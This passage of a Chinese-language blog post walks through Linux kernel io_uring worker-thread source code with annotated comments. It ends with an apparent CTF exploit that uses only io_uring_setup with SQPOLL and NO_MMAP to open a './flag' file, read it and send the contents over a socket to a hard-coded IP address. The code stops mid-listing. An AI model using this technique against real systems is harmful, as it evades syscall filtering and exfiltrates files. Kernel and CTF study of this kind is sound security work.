<span class="type">atomic_inc</span>(&amp;acct-&gt;nr_running);</span><br><span class="line">	<span class="type">atomic_inc</span>(&amp;wq-&gt;worker_refs);</span><br><span class="line">	<span class="keyword">return</span> create_io_worker(wq, acct-&gt;index);</span><br><span class="line">	<span class="comment">// 创建一个新worker</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="create-io-worker-worker处理线程的创建"><code>create_io_worker</code>  |  worker处理线程的创建</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">create_io_worker</span><span class="params">(<span class="keyword">struct</span> io_wq *wq, <span class="type">int</span> index)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_wq_acct</span> *<span class="title">acct</span> =</span> &amp;wq-&gt;acct[index];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_worker</span> *<span class="title">worker</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">tsk</span>;</span></span><br><span class="line"></span><br><span class="line">	__set_current_state(TASK_RUNNING);</span><br><span class="line"></span><br><span class="line">	worker = kzalloc(<span class="keyword">sizeof</span>(*worker), GFP_KERNEL);</span><br><span class="line">	<span class="comment">// 为work分配了空间</span></span><br><span class="line">	<span class="keyword">if</span> (!worker) &#123;</span><br><span class="line">fail:</span><br><span class="line">		<span class="type">atomic_dec</span>(&amp;acct-&gt;nr_running);</span><br><span class="line">		raw_spin_lock(&amp;wq-&gt;lock);</span><br><span class="line">		acct-&gt;nr_workers--;</span><br><span class="line">		raw_spin_unlock(&amp;wq-&gt;lock);</span><br><span class="line">		io_worker_ref_put(wq);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	refcount_set(&amp;worker-&gt;ref, <span class="number">1</span>);</span><br><span class="line">	worker-&gt;wq = wq;</span><br><span class="line">	raw_spin_lock_init(&amp;worker-&gt;lock);</span><br><span class="line">	init_completion(&amp;worker-&gt;ref_done);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (index == IO_WQ_ACCT_BOUND)</span><br><span class="line">		worker-&gt;flags |= IO_WORKER_F_BOUND;</span><br><span class="line"></span><br><span class="line">	tsk = create_io_thread(io_wq_worker, worker, NUMA_NO_NODE);</span><br><span class="line">	<span class="comment">// 创建处理线程</span></span><br><span class="line">	<span class="keyword">if</span> (!IS_ERR(tsk)) &#123;</span><br><span class="line">		io_init_new_worker(wq, worker, tsk);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!io_should_retry_thread(PTR_ERR(tsk))) &#123;</span><br><span class="line">		kfree(worker);</span><br><span class="line">		<span class="keyword">goto</span> fail;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		INIT_WORK(&amp;worker-&gt;work, io_workqueue_create);</span><br><span class="line">		schedule_work(&amp;worker-&gt;work);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="io-wq-worker-内核任务线程"><code>io_wq_worker</code>  | 内核任务线程</h4>
<p>此线程就是线程池中worker的基本单元, 也是真正的异步io处理线程, 其通过自旋锁来阻塞进程, 直到有 work 需要完成.</p>
<p>中间一大段是和线程调度相关的代码, 包括设置信号处理之类的代码, 由于并不是当前分析的重点, 这里笔者就先跳过了.</p>
<p>最终, 是调用了 <code>io_worker_handle_work</code>  来处理任务</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">io_wq_worker</span><span class="params">(<span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_worker</span> *<span class="title">worker</span> =</span> data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_wq_acct</span> *<span class="title">acct</span> =</span> io_wq_get_acct(worker);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_wq</span> *<span class="title">wq</span> =</span> worker-&gt;wq;</span><br><span class="line">	<span class="type">bool</span> exit_mask = <span class="literal">false</span>, last_timeout = <span class="literal">false</span>;</span><br><span class="line">	<span class="type">char</span> buf[TASK_COMM_LEN];</span><br><span class="line"></span><br><span class="line">	worker-&gt;flags |= (IO_WORKER_F_UP | IO_WORKER_F_RUNNING);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">snprintf</span>(buf, <span class="keyword">sizeof</span>(buf), <span class="string">&quot;iou-wrk-%d&quot;</span>, wq-&gt;task-&gt;pid);</span><br><span class="line">	set_task_comm(current, buf);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (!test_bit(IO_WQ_BIT_EXIT, &amp;wq-&gt;state)) &#123;</span><br><span class="line">		<span class="type">long</span> ret;</span><br><span class="line"></span><br><span class="line">		set_current_state(TASK_INTERRUPTIBLE);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span> (io_acct_run_queue(acct))</span><br><span class="line">			io_worker_handle_work(acct, worker);</span><br><span class="line">		<span class="comment">// 轮询  </span></span><br><span class="line">		<span class="comment">// 如果存在需要完成的work </span></span><br><span class="line">		<span class="comment">// io_acct_run_queue 就能持有 acct-&gt;lock 返回</span></span><br><span class="line">		raw_spin_lock(&amp;wq-&gt;lock);</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Last sleep timed out. Exit if we&#x27;re not the last worker,</span></span><br><span class="line"><span class="comment">		 * or if someone modified our affinity.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (last_timeout &amp;&amp; (exit_mask || acct-&gt;nr_workers &gt; <span class="number">1</span>)) &#123;</span><br><span class="line">			acct-&gt;nr_workers--;</span><br><span class="line">			raw_spin_unlock(&amp;wq-&gt;lock);</span><br><span class="line">			__set_current_state(TASK_RUNNING);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		last_timeout = <span class="literal">false</span>;</span><br><span class="line">		__io_worker_idle(wq, worker);</span><br><span class="line">		<span class="comment">// </span></span><br><span class="line">		raw_spin_unlock(&amp;wq-&gt;lock);</span><br><span class="line">		<span class="keyword">if</span> (io_run_task_work())</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		ret = schedule_timeout(WORKER_IDLE_TIMEOUT);</span><br><span class="line">		<span class="keyword">if</span> (signal_pending(current)) &#123;</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">ksignal</span> <span class="title">ksig</span>;</span></span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!get_signal(&amp;ksig))</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (!ret) &#123;</span><br><span class="line">			last_timeout = <span class="literal">true</span>;</span><br><span class="line">			exit_mask = !cpumask_test_cpu(raw_smp_processor_id(),</span><br><span class="line">							wq-&gt;cpu_mask);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (test_bit(IO_WQ_BIT_EXIT, &amp;wq-&gt;state) &amp;&amp; io_acct_run_queue(acct))</span><br><span class="line">		io_worker_handle_work(acct, worker);</span><br><span class="line">		<span class="comment">// worker handle 必须持有 acct-&gt;lock </span></span><br><span class="line"></span><br><span class="line">	io_worker_exit(worker);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="io-worker-handle-work"><code>io_worker_handle_work</code></h4>
<p>这个函数必须持有 <code>acct-&gt;lock</code> 才能进入, 也是此函数真正开始处理任务</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">io_worker_handle_work</span><span class="params">(<span class="keyword">struct</span> io_wq_acct *acct,</span></span><br><span class="line"><span class="params">				  <span class="keyword">struct</span> io_worker *worker)</span></span><br><span class="line">	__<span class="title function_">releases</span><span class="params">(&amp;acct-&gt;lock)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_wq</span> *<span class="title">wq</span> =</span> worker-&gt;wq;</span><br><span class="line">	<span class="type">bool</span> do_kill = test_bit(IO_WQ_BIT_EXIT, &amp;wq-&gt;state);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">io_wq_work</span> *<span class="title">work</span>;</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * If we got some work, mark us as busy. If we didn&#x27;t, but</span></span><br><span class="line"><span class="comment">		 * the list isn&#x27;t empty, it means we stalled on hashed work.</span></span><br><span class="line"><span class="comment">		 * Mark us stalled so we don&#x27;t keep looking for work when we</span></span><br><span class="line"><span class="comment">		 * can&#x27;t make progress, any work completion or insertion will</span></span><br><span class="line"><span class="comment">		 * clear the stalled flag.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		work = io_get_next_work(acct, worker);</span><br><span class="line">		raw_spin_unlock(&amp;acct-&gt;lock);</span><br><span class="line">		<span class="keyword">if</span> (work) &#123;</span><br><span class="line">			__io_worker_busy(wq, worker);</span><br><span class="line"></span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Make sure cancelation can find this, even before</span></span><br><span class="line"><span class="comment">			 * it becomes the active work. That avoids a window</span></span><br><span class="line"><span class="comment">			 * where the work has been removed from our general</span></span><br><span class="line"><span class="comment">			 * work list, but isn&#x27;t yet discoverable as the</span></span><br><span class="line"><span class="comment">			 * current work item for this worker.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			raw_spin_lock(&amp;worker-&gt;lock);</span><br><span class="line">			worker-&gt;next_work = work;</span><br><span class="line">			raw_spin_unlock(&amp;worker-&gt;lock);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		io_assign_current_work(worker, work);</span><br><span class="line">		__set_current_state(TASK_RUNNING);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 处理所有链起来的任务</span></span><br><span class="line">		<span class="keyword">do</span> &#123;</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">io_wq_work</span> *<span class="title">next_hashed</span>, *<span class="title">linked</span>;</span></span><br><span class="line">			<span class="type">unsigned</span> <span class="type">int</span> hash = io_get_work_hash(work);</span><br><span class="line"></span><br><span class="line">			next_hashed = wq_next_work(work);</span><br><span class="line">			<span class="comment">// 获取下一个任务</span></span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (unlikely(do_kill) &amp;&amp; (work-&gt;flags &amp; IO_WQ_WORK_UNBOUND))</span><br><span class="line">				work-&gt;flags |= IO_WQ_WORK_CANCEL;</span><br><span class="line">			wq-&gt;do_work(work);</span><br><span class="line">			<span class="comment">// do_work 来处理任务</span></span><br><span class="line">			io_assign_current_work(worker, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">			linked = wq-&gt;free_work(work);</span><br><span class="line">			<span class="comment">// 断链</span></span><br><span class="line">			work = next_hashed;</span><br><span class="line">			<span class="comment">// 将work改为下一个任务</span></span><br><span class="line">			<span class="keyword">if</span> (!work &amp;&amp; linked &amp;&amp; !io_wq_is_hashed(linked)) &#123;</span><br><span class="line">				work = linked;</span><br><span class="line">				linked = <span class="literal">NULL</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			io_assign_current_work(worker, work);</span><br><span class="line">			<span class="keyword">if</span> (linked)</span><br><span class="line">				io_wq_enqueue(wq, linked);</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">if</span> (hash != <span class="number">-1U</span> &amp;&amp; !next_hashed) &#123;</span><br><span class="line">				<span class="comment">/* serialize hash clear with wake_up() */</span></span><br><span class="line">				spin_lock_irq(&amp;wq-&gt;hash-&gt;wait.lock);</span><br><span class="line">				clear_bit(hash, &amp;wq-&gt;hash-&gt;<span class="built_in">map</span>);</span><br><span class="line">				clear_bit(IO_ACCT_STALLED_BIT, &amp;acct-&gt;flags);</span><br><span class="line">				spin_unlock_irq(&amp;wq-&gt;hash-&gt;wait.lock);</span><br><span class="line">				<span class="keyword">if</span> (wq_has_sleeper(&amp;wq-&gt;hash-&gt;wait))</span><br><span class="line">					wake_up(&amp;wq-&gt;hash-&gt;wait);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">while</span> (work);</span><br><span class="line">		<span class="comment">// 不断循环执行, 直到链上清空</span></span><br><span class="line">		<span class="keyword">if</span> (!__io_acct_run_queue(acct))</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		raw_spin_lock(&amp;acct-&gt;lock);</span><br><span class="line">	&#125; <span class="keyword">while</span> (<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意到这里调用了  <code>do_work</code>  来处理任务, <code>do_work</code> 实际指向的是 <code>io_wq_submit_work</code>, 最终还是调用了 <code>io_issue_queue</code>  来处理任务</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">io_wq_submit_work</span><span class="params">(<span class="keyword">struct</span> io_wq_work *work)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_kiocb</span> *<span class="title">req</span> =</span> container_of(work, <span class="keyword">struct</span> io_kiocb, work);</span><br><span class="line">	<span class="comment">// 通过 work 结构体 直接根据偏移计算拿到 req 的指针</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">io_issue_def</span> *<span class="title">def</span> =</span> &amp;io_issue_defs[req-&gt;opcode];</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> issue_flags = IO_URING_F_UNLOCKED | IO_URING_F_IOWQ;</span><br><span class="line">	<span class="type">bool</span> needs_poll = <span class="literal">false</span>;</span><br><span class="line">	<span class="type">int</span> ret = <span class="number">0</span>, err = -ECANCELED;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* one will be dropped by -&gt;io_wq_free_work() after returning to io-wq */</span></span><br><span class="line">	<span class="keyword">if</span> (!(req-&gt;flags &amp; REQ_F_REFCOUNT))</span><br><span class="line">		__io_req_set_refcount(req, <span class="number">2</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		req_ref_get(req);</span><br><span class="line"></span><br><span class="line">	io_arm_ltimeout(req);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* either cancelled or io-wq is dying, so don&#x27;t touch tctx-&gt;iowq */</span></span><br><span class="line">	<span class="keyword">if</span> (work-&gt;flags &amp; IO_WQ_WORK_CANCEL) &#123;</span><br><span class="line">fail:</span><br><span class="line">		io_req_task_queue_fail(req, err);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!io_assign_file(req, def, issue_flags)) &#123;</span><br><span class="line">		err = -EBADF;</span><br><span class="line">		work-&gt;flags |= IO_WQ_WORK_CANCEL;</span><br><span class="line">		<span class="keyword">goto</span> fail;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (req-&gt;flags &amp; REQ_F_FORCE_ASYNC) &#123;</span><br><span class="line">		<span class="type">bool</span> opcode_poll = def-&gt;pollin || def-&gt;pollout;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (opcode_poll &amp;&amp; file_can_poll(req-&gt;file)) &#123;</span><br><span class="line">			needs_poll = <span class="literal">true</span>;</span><br><span class="line">			issue_flags |= IO_URING_F_NONBLOCK;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		ret = io_issue_sqe(req, issue_flags);</span><br><span class="line">		<span class="comment">// 最终还是调用了 io_issue_sqe 来处理任务</span></span><br><span class="line">		<span class="keyword">if</span> (ret != -EAGAIN)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * If REQ_F_NOWAIT is set, then don&#x27;t wait or retry with</span></span><br><span class="line"><span class="comment">		 * poll. -EAGAIN is final for that case.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (req-&gt;flags &amp; REQ_F_NOWAIT)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * We can get EAGAIN for iopolled IO even though we&#x27;re</span></span><br><span class="line"><span class="comment">		 * forcing a sync submission from here, since we can&#x27;t</span></span><br><span class="line"><span class="comment">		 * wait for request slots on the block side.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (!needs_poll) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!(req-&gt;ctx-&gt;flags &amp; IORING_SETUP_IOPOLL))</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">if</span> (io_wq_worker_stopped())</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			cond_resched();</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (io_arm_poll_handler(req, issue_flags) == IO_APOLL_OK)</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		<span class="comment">/* aborted or ready, in either case retry blocking */</span></span><br><span class="line">		needs_poll = <span class="literal">false</span>;</span><br><span class="line">		issue_flags &amp;= ~IO_URING_F_NONBLOCK;</span><br><span class="line">	&#125; <span class="keyword">while</span> (<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* avoid locking problems by failing it from a clean context */</span></span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">		io_req_task_queue_fail(req, ret);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="summary">summary</h2>
<p>笔者已经从上至下，透视了整个io_uring的实现//</p>
<p>当然，在这篇文章，笔者还留下了很多问题，比如linux kernel与同步和异步过程相关的实现， 由于笔者太菜了，对于kernel部分代码的分析也稍显吃力。</p>
<p>不过就这篇文章而言，在用户态io_uring的使用，笔者应该讲述得很清晰了。</p>
<p>最后，再让我们回到文章开始的问题：</p>
<p>如何只用一个 <code>io_uring_setup</code> 实现ORW?</p>
<p>在完全看完整篇文章后，大家应该也有答案了：</p>
<ul>
<li>设置 <code>IORING_SETUP_SQPOLL</code>  此时不再需要 <code>io_uring_submite</code> 提交</li>
<li>设置 <code>IORING_SETUP_NOMMAP</code>  此时不再需要之后mmap ring和sqe</li>
</ul>
<h2 id="TODO">TODO</h2>
<ul>
<li>ctx 初始化分析</li>
<li>线程调度分析</li>
<li>wq队列处理分析</li>
</ul>
<h2 id="exp">exp</h2>
<p>笔者在实际利用时发现, 在笔者的笔记本的qemu的环境里, 似乎是因为只有一个core, 如果控制权转移给了<code>io_sq_thread</code> 线程, 除非其主动转移控制权, 主进程基本会直接阻塞, 因此, open sq的处理实际要在 <code>io_uring_setup</code> 创建返回fd之前, 因此 flag文件的fd为3 才能稳定应用</p>
<p>通过Socket连接写回：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_params</span> <span class="title">params</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">char</span> flag[<span class="number">0x10</span>] = <span class="string">&quot;./flag\x00&quot;</span>;</span><br><span class="line">    <span class="type">char</span> buff[<span class="number">0x10</span>] = <span class="string">&quot;AAAAAAAA\n&quot;</span>;</span><br><span class="line">    <span class="type">void</span> *ring_ptr;</span><br><span class="line">    <span class="type">unsigned</span> *ktail;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        __u64 a1;</span><br><span class="line">        __u64 a2;</span><br><span class="line">    &#125; socket_add = <span class="comment">//&#123;0x0100007f5c110002, 0&#125;;</span></span><br><span class="line">        &#123;<span class="number">0x017aa8c05c110002</span>,<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="comment">// mmap(0xC0D3000uLL, 0x3000uLL, 7uLL, 34u, 0xFFFFFFFFuLL, 0LL);</span></span><br><span class="line">    params.sq_off.user_addr = <span class="number">0xC0D3000</span> + <span class="number">0x1000</span>;</span><br><span class="line">    ring_ptr = params.cq_off.user_addr = <span class="number">0xC0D3000</span> + <span class="number">0x2000</span>;</span><br><span class="line">    params.flags = IORING_SETUP_SQPOLL | IORING_SETUP_NO_MMAP | IORING_SETUP_NO_SQARRAY;</span><br><span class="line"></span><br><span class="line">    params.sq_thread_idle = <span class="number">0x2000000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> *<span class="title">sqe</span> =</span> (<span class="keyword">struct</span> io_uring_sqe *)(<span class="number">0xC0D3000</span> + <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    sqe[<span class="number">0</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">    sqe[<span class="number">0</span>].flags = IOSQE_IO_LINK;</span><br><span class="line">    sqe[<span class="number">0</span>].fd = <span class="number">-100</span>;</span><br><span class="line">    sqe[<span class="number">0</span>].addr = flag;</span><br><span class="line"></span><br><span class="line">    sqe[<span class="number">1</span>].opcode = IORING_OP_READ;</span><br><span class="line">    sqe[<span class="number">1</span>].flags = IOSQE_IO_LINK;</span><br><span class="line">    sqe[<span class="number">1</span>].fd = <span class="number">3</span>;</span><br><span class="line">    sqe[<span class="number">1</span>].addr = buff;</span><br><span class="line">    sqe[<span class="number">1</span>].len = <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line">    sqe[<span class="number">2</span>].opcode = IORING_OP_SOCKET;</span><br><span class="line">    